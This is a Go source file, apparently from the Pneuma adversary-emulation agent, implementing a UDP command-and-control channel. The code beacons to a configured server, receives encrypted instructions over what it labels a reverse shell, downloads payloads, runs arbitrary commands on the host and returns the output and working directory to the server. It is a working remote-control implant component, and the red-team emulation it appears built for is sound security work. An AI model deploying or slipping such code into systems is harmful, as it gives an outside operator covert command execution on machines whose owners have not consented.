package sockets

import (
	"bufio"
	"bytes"
	"encoding/json"
	"github.com/preludeorg/pneuma/commands"
	"github.com/preludeorg/pneuma/util"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"
)

type UDP struct {}

func init() {
	CommunicationChannels["udp"] = UDP{}
}

func (contact UDP) Communicate(wg *sync.WaitGroup, agent *util.AgentConfig, beacon Beacon) {
	defer wg.Done()
	for {
		conn, err := net.Dial("udp", agent.Address)
	   	if err != nil {
	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
	   	} else {
	   		udpListen(conn, beacon, agent)
	   	}
	   	jitterSleep(agent.Sleep, "UDP")
	}
}

func udpListen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
	//initial beacon
	udpBufferedSend(conn, beacon)

	//reverse-shell
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
		message := strings.TrimSpace(scanner.Text())
		go udpRespond(conn, beacon, message, agent)
    }
}

func udpRespond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig){
	var tempB Beacon
	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
	beacon.Links = beacon.Links[:0]
	for _, link := range tempB.Links {
		var payloadPath string
		if len(link.Payload) > 0 {
			payloadPath = requestPayload(link.Payload)
		}
		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
		link.Response = strings.TrimSpace(response) + "\r\n"
		link.Status = status
		link.Pid = pid
		beacon.Links = append(beacon.Links, link)
	}
	pwd, _ := os.Getwd()
	beacon.Pwd = pwd
	udpBufferedSend(conn, beacon)
}

func udpBufferedSend(conn net.Conn, beacon Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		conn.Write(sendBuffer)
	}
}